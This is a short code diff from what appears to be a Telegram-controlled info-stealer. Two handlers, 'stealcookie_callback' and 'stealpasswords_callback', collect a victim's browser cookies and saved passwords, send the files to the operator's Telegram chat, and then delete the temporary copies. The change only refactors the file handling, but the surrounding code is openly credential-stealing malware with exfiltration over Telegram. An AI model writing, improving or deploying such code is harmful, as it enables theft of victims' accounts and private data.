@@ -15,7 +15,9 @@ async def stealcookie_callback(bot, call):
         if cookie[0]:
             await send_message(bot, call.message.chat.id, cookie[1], reply_markup=markup)
             continue
-        await bot.send_document(call.message.chat.id, open(cookie[1], 'rb'), reply_markup=markup)
+
+        with open(cookie[1], 'rb') as f:
+            await bot.send_document(call.message.chat.id, f, reply_markup=markup)
 
     delete_tmp_cookies()
 
@@ -25,7 +27,8 @@ async def stealpasswords_callback(bot, call):
 
     passwords_path = steal_passwords()
 
-    await bot.send_document(call.message.chat.id, open(passwords_path, 'rb'), reply_markup=markup)
+    with open(passwords_path, 'rb') as f:
+        await bot.send_document(call.message.chat.id, f, reply_markup=markup)
 
     delete_tmp_passwords()
 
